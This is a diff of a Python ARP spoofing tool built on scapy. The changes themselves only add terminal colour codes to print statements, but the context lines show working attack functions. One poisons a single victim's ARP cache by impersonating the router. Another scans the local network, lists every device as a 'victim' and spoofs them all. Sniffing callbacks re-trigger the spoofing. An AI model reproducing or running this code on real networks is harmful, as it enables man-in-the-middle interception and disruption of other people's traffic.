@@ -50,12 +50,12 @@ def arp_spoof1():
   arp = ARP(pdst=victim_ip, psrc=routeur_ip, op="is-at")
   packet = ethernet / arp
   sendp(packet, iface=iface)
-  print("[*] Spoof Sent")
+  print("\033[1;11m [*] Spoof Sent")
 
 
 def arp_sniffing1(pkt):
     if pkt[ARP].op == 1:  # is-at (response)
-        print('\n\n[i] Response : ( {0} ) MAC address : ( {1} )'.format(pkt[ARP].hwsrc, pkt[ARP].psrc))
+        print('\033[3;32m \n\n[i] Response : ( {0} ) MAC address : ( {1} )'.format(pkt[ARP].hwsrc, pkt[ARP].psrc))
         arp_spoof1()
 
 
@@ -80,7 +80,7 @@ def arp_spoof2(): # Get all MAC addresses of the network + spoof them
       # For each response, we add ip and mac to the 'victimes' list
       victimes.append({'ip': received.psrc, 'mac': received.hwsrc})
   # Print all network victims
-  print("\nCONNECTED DEVICES ON THE NETWORK")
+  print("\033[3;35m \nCONNECTED DEVICES ON THE NETWORK")
   print("IP" + " "*18+"MAC")
   for x in victimes:
       print("{:16}    {}".format(x['ip'], x['mac']))
@@ -93,12 +93,12 @@ def arp_spoof2(): # Get all MAC addresses of the network + spoof them
       arp = ARP(pdst=x['ip'], psrc=routeur_ip, op="is-at")
       packet = ethernet / arp
       sendp(packet, iface=iface)
-      print("[*]Spoof sent to ( {0} )".format(x['ip']))
+      print("\033[1;11m [*]Spoof sent to ( {0} )".format(x['ip']))
 
 
 def arp_sniffing2(pkt):
   if pkt[ARP].op == 1:  # is-at (response)
-        print('\n\n[i] Response of : ( {0} ) MAC address : ( {1} )'.format(pkt[ARP].hwsrc, pkt[ARP].psrc))
+        print('\033[3;32m \n\n[i] Response of : ( {0} ) MAC address : ( {1} )'.format(pkt[ARP].hwsrc, pkt[ARP].psrc))
         arp_spoof2()
 
 
